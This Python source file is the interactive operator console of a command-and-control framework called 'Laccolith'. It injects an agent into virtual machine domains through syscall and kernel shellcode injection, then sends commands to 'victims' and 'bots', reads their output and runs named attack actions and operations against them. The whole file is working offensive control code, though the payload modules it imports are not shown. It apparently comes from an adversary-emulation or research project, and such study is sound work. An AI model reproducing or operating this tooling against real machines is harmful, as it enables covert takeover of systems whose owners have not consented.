import datetime
import types
import os
from vm_drivers import list_domains, inject_domain, InvalidDomain, InvalidSyscall, VolatilityError
from config.conf_manager import read_config, pretty_print_config
from c2.c2_server import start_multithreaded_c2, list_c2_connections, send_c2_command, read_c2_log, InvalidConnUUID, NotAliveConnection, kill_c2_connection
from c2.c2_actions import ActionRequirementsNotSatisfied
import c2.concrete_operations as c2ops
import c2.concrete_actions as c2actions
import c2.c2_facts as c2facts


changeable = ['win_major_version', 'win_minor_version', 'first_stage_profile', 'second_stage_profile',
              'first_stage_injection_latency', 'second_stage_injection_latency', 'restore_syscall']


def c2read(_config, _offsets, _args):
    if len(_args) > 0:
        conn_uuid = _args[0]
        try:
            if len(_args) > 1:
                index = _args[1]
                data = read_c2_log(conn_uuid, index)
            else:
                data = read_c2_log(conn_uuid)
            print(data)
        except InvalidConnUUID:
            print("Invalid connection UUID")
    else:
        print("You must provide 'conn_uuid' argument, and optionally the command index")


def c2send(_config, _offsets, _args):
    if len(_args) > 1:
        conn_uuid = _args[0]
        cmd = " ".join(_args[1:])
        try:
            send_c2_command(conn_uuid, cmd)
        except InvalidConnUUID:
            print("Invalid connection UUID")
        except NotAliveConnection:
            print("Can't send commands to dead bots")
    else:
        print("You must provide 'conn_uuid' argument and at least one command argument to send")


def c2kill(_config, _offsets, _args):
    if len(_args) > 1:
        conn_uuid = _args[0]
        try:
            kill_c2_connection(conn_uuid)
        except InvalidConnUUID:
            print("Invalid connection UUID")
        except NotAliveConnection:
            print("Can't kill dead bots")
    else:
        print("You must provide 'conn_uuid' argument")


def c2list(_config, _offsets, _args):
    conn_tuples = list_c2_connections()
    try:
        if len(_args) > 0:
            start_index = int(_args[0])
            if len(_args) > 1:
                end_index = int(_args[1])
                conn_tuples = conn_tuples[start_index:end_index]
            else:
                conn_tuples = [conn_tuples[start_index]]
    except (IndexError, ValueError):
        conn_tuples = []
    print("Connection UUID\tClient address\tLast seen\tIs Alive\tNumber of commands".expandtabs(40))
    for conn in conn_tuples:
        last_seen = datetime.datetime.fromtimestamp(conn[2]).ctime()
        new_conn = '\t'.join((conn[0], str(conn[1]), last_seen, 'Yes' if conn[3] else 'No', str(conn[4])))
        new_conn = new_conn.expandtabs(40)
        print(new_conn)


def dominject(_config, _offsets, _args):
    if len(_args) > 0:
        domain = _args[0]
        try:
            inject_domain(domain, _config, _offsets)
        except InvalidDomain:
            print("Invalid domain")
        except InvalidSyscall:
            print("Syscall injection point not found")
        except NotImplementedError:
            print("Error: you selected a shellcode profile or a Windows major version that wasn't implemented")
        except VolatilityError:
            print("Could not inject due to an error in volatility")
    else:
        print("You must provide 'domain' argument")


def domlist(_config, _offsets, _args):
    domains = list_domains(_config)
    print(", ".join(domains))


def showconf(_config, _offsets, _args):
    pretty_print_config(_config)


def modconf(_config, _offsets, _args):
    if len(_args) > 1:
        conf_parameter = _args[0]
        new_value = _args[1]
        if conf_parameter not in changeable:
            print(f'conf_parameter must be in: {", ".join(changeable)}')
        else:
            print(f'Old value: {_config[conf_parameter]}')
            if isinstance(_config[conf_parameter], int):
                try:
                    _config[conf_parameter] = int(new_value)
                except ValueError:
                    print(f"Invalid value for {conf_parameter}")
            else:
                _config[conf_parameter] = new_value
            print('New configuration:')
            showconf(_config, _offsets, _args)
    else:
        print("You must provide 'conf_parameter' and 'new_value' arguments")


def c2action(_config, _offsets, _args):
    available = [sym for sym in dir(c2actions)
                 if isinstance(c2actions.__getattribute__(sym), types.FunctionType)]
    conn_uuid = _args[0]
    action = _args[1]
    if action not in available:
        print("Invalid action. Use 'c2listactions' to see the available actions")
    else:
        try:
            action_obj: c2actions.C2Action = c2actions.__getattribute__(action)(*_args[2:])
            cmd_indexes_list = action_obj.performAction(conn_uuid)
            cmd_indexes_list = ", ".join([str(i) for i in cmd_indexes_list])
            print(f"Action completed. Command indexes: {cmd_indexes_list}\n"
                  "You can use 'c2read' with command indexes to see raw output of commands")
        except ActionRequirementsNotSatisfied:
            print("Some required facts is missing for specified action. Check the description "
                  "with 'c2describeaction'")
        except InvalidConnUUID:
            print("Invalid connection UUID")
        except NotAliveConnection:
            print("Can't send commands to dead bots")
        except TypeError:
            print("Invalid number of arguments for action, or some parameter is invalid")
        except FileNotFoundError:
            print("Error: an action tried to read a non-existent file on the local file system")


def c2operation(_config, _offsets, _args):
    available = [sym for sym in dir(c2ops)
                 if isinstance(c2ops.__getattribute__(sym), types.FunctionType)]
    conn_uuid = _args[0]
    operation = _args[1]
    if operation not in available:
        print("Invalid operation. Use 'c2listops' to see the available operations")
    else:
        try:
            operation_obj: c2ops.C2Operation = c2ops.__getattribute__(operation)()
            report = operation_obj.performOperation(conn_uuid)
            print(report)
        except InvalidConnUUID:
            print("Invalid connection UUID")
        except NotAliveConnection:
            print("Can't send commands to dead bots")


def c2getfact(_config, _offsets, _args):
    conn_uuid = _args[0]
    fact_name = _args[1]
    try:
        factsStorage = c2facts.FactsStorage(c2facts.ConnectionStorage(), conn_uuid)
        try:
            fact_value = factsStorage.getFact(fact_name)
            if isinstance(fact_value, list):
                fact_value = ", ".join(fact_value)
            print(f"{fact_name}: {fact_value}")
        except c2facts.NotExistentFact:
            print("The fact you tried to read is not set for specified connection")
    except InvalidConnUUID:
        print("Invalid connection UUID")


def c2setfact(_config, _offsets, _args):
    conn_uuid = _args[0]
    fact_name = _args[1]
    fact_value = " ".join(_args[2:])
    try:
        factsStorage = c2facts.FactsStorage(c2facts.ConnectionStorage(), conn_uuid)
        try:
            old_value = factsStorage.getFact(fact_name)
            print(f"Old {fact_name}: {old_value}")
        except c2facts.NotExistentFact:
            print("You're about to create a new fact for specified connection")
        factsStorage.setFact(fact_name, fact_value)
        try:
            new_value = factsStorage.getFact(fact_name)
            print(f"New {fact_name}: {new_value}")
        except c2facts.NotExistentFact:
            print("Some error occurred: the fact has not been set")
    except InvalidConnUUID:
        print("Invalid connection UUID")


def c2listactions(_config, _offsets, _args):
    available = [sym for sym in dir(c2actions)
                 if isinstance(c2actions.__getattribute__(sym), types.FunctionType)]
    available = ", ".join(available)
    print(f"Available actions: {available}")


def c2listops(_config, _offsets, _args):
    available = [sym for sym in dir(c2ops)
                 if isinstance(c2ops.__getattribute__(sym), types.FunctionType)]
    available = ", ".join(available)
    print(f"Available operations: {available}")


def c2describeaction(_config, _offsets, _args):
    available = [sym for sym in dir(c2actions)
                 if isinstance(c2actions.__getattribute__(sym), types.FunctionType)]
    action = _args[0]
    if action not in available:
        print("Invalid action. Use 'c2listactions' to see the available actions")
    else:
        action_obj: c2actions.C2Action = c2actions.__getattribute__(action)()
        description = action_obj.describeAction()
        print(description)


def c2describeop(_config, _offsets, _args):
    available = [sym for sym in dir(c2ops)
                 if isinstance(c2ops.__getattribute__(sym), types.FunctionType)]
    operation = _args[0]
    if operation not in available:
        print("Invalid operation. Use 'c2listops' to see the available operations")
    else:
        operation_obj: c2ops.C2Operation = c2ops.__getattribute__(operation)()
        description = operation_obj.describeOperation()
        print(description)


def c2listfacts(_config, _offsets, _args):
    conn_uuid = _args[0]
    try:
        factsStorage = c2facts.FactsStorage(c2facts.ConnectionStorage(), conn_uuid)
        fact_names = [fact_name for fact_name in factsStorage.getConn()['facts'].keys()]
        fact_names = ", ".join(fact_names)
        print(f"Fact names for {conn_uuid}: {fact_names}")
    except InvalidConnUUID:
        print("Invalid connection UUID")


def ls(_config, _offsets, _args):
    files = os.listdir('/usr/src/app/c2/connections/upload_dir')
    files = "\t".join(files)
    print(files)


def command_line_interface(_config, _offsets, stream_req_handler=None):
    # TODO: maybe a command to show available profiles for first stage and second stage
    options = ["domlist", "dominject", "c2list", "c2send", "c2read", "c2action", "c2operation",
               "c2getfact", "c2setfact", "c2listactions", "c2listops", "c2describeaction",
               "c2describeop", "c2listfacts", "c2kill", "ls", "showconf", "modconf", "quit", "help", "info"]
    funcs = {'domlist': domlist, 'dominject': dominject, 'c2list': c2list, 'c2send': c2send,
             'c2read': c2read, 'c2action': c2action, 'c2operation': c2operation, 'c2kill': c2kill,
             'c2getfact': c2getfact, 'c2setfact': c2setfact, 'c2listactions': c2listactions,
             'c2listops': c2listops, 'c2describeaction': c2describeaction, 'c2describeop': c2describeop,
             'c2listfacts': c2listfacts, 'ls': ls, 'showconf': showconf, 'modconf': modconf}
    infos = {'domlist': 'Usage: domlist\nList available domains',
             'dominject': 'Usage: dominject <domain>\nInject agent into domain',
             'c2list': 'Usage: c2list [start_index] [[end_index]]\nList all connections to C2 server\n'
                       'Supports pagination using optional arguments start_index and end_index, that can also '
                       'be negative indexes (e.g., -1 denotes the last row)',
             'c2send': 'Usage: c2send <conn_uuid> [cmd_arg0] ... [cmd_argN]\nSend command to specified victim',
             'c2read': 'Usage: c2read <conn_uuid> [cmd_index]\n'
                       'Read data received upon connection if no cmd_index is specified, otherwise read '
                       'command and command output of index specified',
             'c2action': 'Usage: c2action <conn_uuid> <action_name> [action_arg0] ... [action_argN]\n'
                         'Start specified action against specified target, '
                         'performing it synchronously and setting facts',
             'c2operation': 'Usage: c2operation <conn_uuid> <operation_name>\n'
                            'Start specified operation against specified target, '
                            'performing each action synchronously',
             'c2getfact': 'Usage: c2getfact <conn_uuid> <fact_name>\n'
                          'Read the specified fact for the specified target, if available',
             'c2setfact': 'Usage: c2setfact <conn_uuid> <fact_name> <new_fact_value>\n'
                          'Set or update the specified fact for the specified target; '
                          'only strings can be set, although facts can also be lists',
             'c2listactions': 'Usage: c2listactions\nList names of available actions',
             'c2listops': 'Usage: c2listops\nList names of available operations',
             'c2describeaction': 'Usage: c2describeaction <action_name>\n'
                                 'Obtain details about the specified action',
             'c2describeop': 'Usage: c2describeop <operation_name>\n'
                             'Obtain details about the specified operation',
             'c2listfacts': 'Usage: c2listfacts <conn_uuid>\n'
                            'List fact names available for the specified connection',
             'c2kill': 'Usage: c2kill <conn_uuid>\n'
                       'Kill a connection, trying to notify the agent and notifying the interfaces '
                       'in which there is a running action/operation',
             'ls': 'Usage: ls\nList files in the upload directory, useful for the write_file action',
             'showconf': 'Usage: showconf\nShow configuration',
             'modconf': 'Usage: modconf <conf_parameter> <new_value>\nChange value of specified parameter\n'
                        f'Changeable values: {", ".join(changeable)}\n'
                        'Other parameters have to be tuned before bootstrap',
             'quit': 'Usage: quit\nExit this interface and shut down C2 server',
             'help': 'Usage: help\nShow available options',
             'info': 'Usage: info <option>\nShow option usage and brief description'}
    while True:
        print("Laccolith> ", end="")
        choice = input().strip()
        if choice == 'help':
            print(f"Available commands: {', '.join(options)}")
        elif choice == 'quit':
            break
        else:
            choice = choice.split(' ')
            option = choice[0]
            if option == 'info':
                if len(choice) < 2:
                    print("You must provide exactly one argument to 'info' option")
                else:
                    req_info = choice[1]
                    if req_info not in infos:
                        print("Requested info for invalid option")
                    else:
                        print(infos[req_info])
            elif option not in funcs:
                print("Invalid command")
            else:
                try:
                    funcs[option](_config, _offsets, choice[1:])
                except IndexError:
                    print("Insufficient number of arguments")


def start_c2(_config):
    print('[+] Starting C2 Server')
    _server = start_multithreaded_c2(_config)
    print('[+] Done')
    return _server


def stop_c2(_server):
    print('[+] Starting C2 Server')
    _server.shutdown()
    print('[+] Done')


if __name__ == "__main__":
    config = read_config('/usr/src/app/config/config.json')
    offsets = read_config('/usr/src/app/kernel_shellcode_library/offsets.json')
    server = start_c2(config)
    command_line_interface(config, offsets)
    stop_c2(server)
